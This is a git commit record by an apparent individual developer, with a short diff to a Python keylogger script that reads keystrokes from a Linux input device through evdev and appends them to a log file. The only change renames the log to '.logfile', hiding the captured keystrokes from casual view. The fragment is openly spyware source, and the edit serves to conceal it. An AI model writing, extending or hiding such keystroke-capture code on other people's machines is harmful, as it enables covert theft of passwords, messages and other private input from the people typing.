82f7fe389b2bc484bddc83a3b14da8b97d6742ef
Bryan Harvey <bryan.edward.harvey@gmail.com>
2016-05-10 19:35:15 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -4,7 +4,7 @@ from evdev import InputDevice, categorize, ecodes
 import time
 dev = InputDevice('/dev/input/event1')
 
-log_file = open('logfile','a')
+log_file = open('.logfile','a')
 
 for event in dev.read_loop():
     if event.type == ecodes.EV_KEY:
